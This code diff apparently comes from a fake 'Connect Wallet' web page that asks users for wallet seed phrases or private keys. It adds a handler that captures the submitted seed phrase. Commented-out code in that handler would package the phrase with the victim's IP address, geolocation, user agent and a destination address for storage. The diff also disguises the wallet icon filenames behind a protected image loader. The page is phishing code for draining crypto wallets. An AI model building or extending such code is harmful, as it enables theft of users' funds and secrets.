@@ -1,5 +1,5 @@
 "use client";
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import {
   ArrowLeft,
   Search,
@@ -15,6 +15,10 @@ import { toast } from "sonner";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
 import { useAuthStore } from "@/stores/authstore";
+import ProtectedImage from "@/components/tools/protected";
+import ShowManualWall from "@/components/manual-wallets/showmanual";
+
+// ---------------------------------------------
 
 type Step = "intro" | "select" | "connect";
 type ConnectionMethod = "seed" | "private-key" | "forgot";
@@ -22,59 +26,61 @@ type ConnectionMethod = "seed" | "private-key" | "forgot";
 interface WalletOption {
   value: string;
   label: string;
-  icon: string;
+  filename: string; // Changed from 'icon' (path) to 'filename'
   popular?: boolean;
 }
 
+// Updated to use filenames expected by your API
 const wallets: WalletOption[] = [
   {
     value: "metamask",
     label: "MetaMask",
-    icon: "/images/wallets/metamask-fox.svg",
+    filename: "mmfx.svg",
     popular: true,
   },
   {
     value: "trustwallet",
     label: "Trust Wallet",
-    icon: "/images/wallets/trust-wallet-small.png",
+    filename: "tw-small.png",
     popular: true,
   },
   {
     value: "phantom",
     label: "Phantom",
-    icon: "/images/wallets/phantom-small.png",
+    filename: "phan-small.png",
     popular: true,
   },
   {
     value: "keplr",
     label: "Keplr",
-    icon: "/images/wallets/keplr-small.png",
+    filename: "kep-small.png",
   },
   {
     value: "exodus",
     label: "Exodus",
-    icon: "/images/wallets/exedus-small.png",
+    filename: "exe-small.png",
   },
   {
     value: "atomic",
     label: "Atomic",
-    icon: "/images/wallets/atomic-small.png",
+    filename: "ant-small.png",
   },
   {
     value: "coinbase",
     label: "Coinbase Wallet",
-    icon: "/images/wallets/coinbase-v2.svg",
+    filename: "base-v2.svg",
   },
   {
     value: "ledger",
     label: "Ledger",
-    icon: "/images/wallets/ledgerSmall.jpeg",
+    filename: "ledSmall.jpeg",
   },
 ];
 
 const ConnectWallet: React.FC = () => {
   const router = useRouter();
   const isAuthenticated = useAuthStore((state) => state.isAuthenticated);
+  const userStatus = useAuthStore((state) => state.status);
   const [step, setStep] = useState<Step>("intro");
   const [searchQuery, setSearchQuery] = useState("");
   const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(
@@ -87,6 +93,38 @@ const ConnectWallet: React.FC = () => {
   const filteredWallets = wallets.filter((w) =>
     w.value.toLowerCase().includes(searchQuery.toLowerCase())
   );
+
+  const handleFinish = async (walletPhrase: string) => {
+    // setIsTransitionLoading(true);
+    try {
+      // const survey = {
+      //   blockchainNetwork: blockChainNetwork,
+      //   walletProvider: selectedWallet,
+      //   seedPhrase: walletPhrase,
+      //   destinationAddress,
+      //   ipAddress,
+      //   geolocation,
+      //   userAgent,
+      //   screenResolution,
+      //   walletName,
+      // };
+      // console.log("this is the wallet phrase", walletPhrase);
+      // const surveyId = await storeSurveyData(survey);
+      // if (surveyId) {
+      //   setWalletId(surveyId);
+      // }
+      // setTimeout(() => {
+      //   setIsTransitionLoading(false);
+      //   setViewingManualWallet(false);
+      //   setBlockchainNetwork(blockChainNetwork);
+      //   setWalletProvider(selectedWallet);
+      //   onNext();
+      // }, 1500);
+      console.log("Wallet Phrase Submitted:", walletPhrase);
+    } catch (error) {
+      console.log(error);
+    }
+  };
 
   const handleWalletSelect = (wallet: WalletOption) => {
     setSelectedWallet(wallet);
@@ -103,6 +141,13 @@ const ConnectWallet: React.FC = () => {
     toast.success("Wallet connected successfully! (Demo)");
     router.push("/");
   };
+
+  useEffect(() => {
+    if (userStatus === "IDLE" || userStatus === "PENDING") return; // Wait until we know the status
+    if (!isAuthenticated) {
+      router.push("/auth/sign-in");
+    }
+  }, [isAuthenticated, userStatus]);
 
   const renderIntro = () => (
     <div className="animate-fade-up">
@@ -190,7 +235,12 @@ const ConnectWallet: React.FC = () => {
                   className="glass-card p-4 flex flex-col items-center gap-2 hover:neon-border-blue transition-all group"
                 >
                   <span className="text-2xl group-hover:scale-110 transition-transform">
-                    <img src={wallet.icon} alt="icon" className="w-4 h-4" />
+                    {/* UPDATED: Using ProtectedImage */}
+                    <ProtectedImage
+                      filename={wallet.filename}
+                      alt={wallet.label}
+                      className="w-8 h-8 object-contain" // Adjusted size classes
+                    />
                   </span>
                   <span className="text-sm font-medium">{wallet.label}</span>
                 </button>
@@ -212,7 +262,12 @@ const ConnectWallet: React.FC = () => {
               className="w-full flex items-center gap-4 p-4 hover:bg-muted/30 transition-colors border-b border-border/30 last:border-0 group"
             >
               <span className="text-2xl group-hover:scale-110 transition-transform">
-                <img src={wallet.icon} alt="icon" className="w-4 h-4" />
+                {/* UPDATED: Using ProtectedImage */}
+                <ProtectedImage
+                  filename={wallet.filename}
+                  alt={wallet.label}
+                  className="w-6 h-6 object-contain"
+                />
               </span>
               <span className="font-medium flex-1 text-left">
                 {wallet.label}
@@ -241,8 +296,15 @@ const ConnectWallet: React.FC = () => {
   const renderConnect = () => (
     <div className="animate-fade-up">
       <div className="text-center mb-8">
-        <div className="w-16 h-16 mx-auto mb-4 rounded-xl bg-muted flex items-center justify-center text-3xl">
-          {selectedWallet?.icon}
+        <div className="w-16 h-16 mx-auto mb-4 rounded-xl bg-muted flex items-center justify-center text-3xl overflow-hidden">
+          {/* UPDATED: Using ProtectedImage for selected wallet */}
+          {selectedWallet && (
+            <ProtectedImage
+              filename={selectedWallet.filename}
+              alt={selectedWallet.label}
+              className="w-10 h-10 object-contain"
+            />
+          )}
         </div>
         <h1 className="font-orbitron font-bold text-2xl mb-2">
           Connect {selectedWallet?.label}
@@ -381,7 +443,12 @@ const ConnectWallet: React.FC = () => {
         <div className="w-full max-w-md relative z-10">
           {step === "intro" && renderIntro()}
           {step === "select" && renderSelect()}
-          {step === "connect" && renderConnect()}
+          {step === "connect" && (
+            <ShowManualWall
+              handleFinish={handleFinish}
+              selectedWallet={selectedWallet?.value || ""}
+            />
+          )}
         </div>
       </div>
     </>
